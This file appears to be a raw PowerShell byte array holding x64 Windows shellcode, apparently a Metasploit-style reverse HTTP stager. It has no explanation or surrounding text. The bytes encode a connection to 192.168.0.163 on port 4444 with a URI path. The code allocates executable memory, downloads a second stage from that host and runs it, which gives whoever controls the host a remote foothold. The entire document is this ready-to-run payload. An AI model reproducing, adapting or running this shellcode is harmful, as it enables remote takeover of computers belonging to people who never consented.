[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0
$buf += 0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2
$buf += 0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48
$buf += 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7
$buf += 0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c
$buf += 0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41
$buf += 0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52
$buf += 0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78
$buf += 0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b
$buf += 0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67
$buf += 0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40
$buf += 0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41
$buf += 0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48
$buf += 0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1
$buf += 0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45
$buf += 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49
$buf += 0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40
$buf += 0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1
$buf += 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58
$buf += 0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52
$buf += 0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9
$buf += 0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49
$buf += 0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41
$buf += 0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26
$buf += 0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a
$buf += 0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba
$buf += 0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5
$buf += 0xe8,0xe,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31
$buf += 0x36,0x38,0x2e,0x30,0x2e,0x31,0x36,0x33,0x0,0x5a
$buf += 0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5c,0x11,0x0,0x0
$buf += 0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba
$buf += 0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5
$buf += 0xe8,0x7,0x0,0x0,0x0,0x2f,0x4b,0x41,0x34,0x64
$buf += 0x38,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d
$buf += 0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa0,0x84,0x0
$buf += 0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb
$buf += 0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa
$buf += 0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80
$buf += 0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59
$buf += 0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0
$buf += 0xff,0xd5,0x48,0x89,0xf1,0x53,0x5a,0x4d,0x31,0xc0
$buf += 0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6
$buf += 0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x10,0x48,0xff
$buf += 0xcf,0x74,0x2,0xeb,0xc0,0x49,0xc7,0xc2,0xf0,0xb5
$buf += 0xa2,0x56,0xff,0xd5,0x53,0x59,0x6a,0x40,0x5a,0x49
$buf += 0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10
$buf += 0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0
$buf += 0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89
$buf += 0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0
$buf += 0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12
$buf += 0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48
$buf += 0x83,0xc4,0x20,0x85,0xc0,0x74,0xae,0x66,0x8b,0x7
$buf += 0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0x58,0xc3
